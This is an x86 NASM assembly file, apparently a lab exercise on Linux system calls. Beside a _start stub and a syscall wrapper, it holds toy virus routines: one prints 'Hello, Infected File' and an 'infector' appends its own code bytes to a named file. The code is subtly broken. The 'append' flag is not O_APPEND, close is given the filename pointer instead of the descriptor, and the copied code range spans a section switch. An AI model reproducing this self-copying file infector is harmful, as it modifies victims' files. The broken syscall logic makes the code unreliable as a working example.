section .text
global _start
global system_call
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
;Define the code_start label
code_start:
section .data
    msg db 'Hello, Infected File', 0xA
    len equ $-msg
section .text
    global infection
infection:
    mov eax, 4          ; system call for write
    mov ebx, 1          ; file descriptor for stdout
    mov ecx, msg       ; message to write
    mov edx, len       ; message length
    int 0x80            ; call kernel

    ret

global infector
infector:
    push ebp
    mov ebp, esp
    push ebx

    ; open file for append
    mov eax, 5          ; system call for open
    mov ebx, [ebp+8]    ; pointer to filename
    mov ecx, 0x41       ; flag for append
    mov edx, 0777       ; file permissions
    int 0x80            ; call kernel
    mov ebx, eax        ; save file descriptor

    ; write infection code to file
    mov eax, 4          ; system call for write
    mov ecx, code_start ; pointer to code
    mov edx, code_end - code_start ; calculate length
    int 0x80            ; call kernel

    ; close file
    mov eax, 6          ; system call for close
    mov ebx, [ebp+8]    ; file descriptor
    int 0x80            ; call kernel

    pop ebx
    pop ebp
    ret    

; Define the code_start label
code_end:





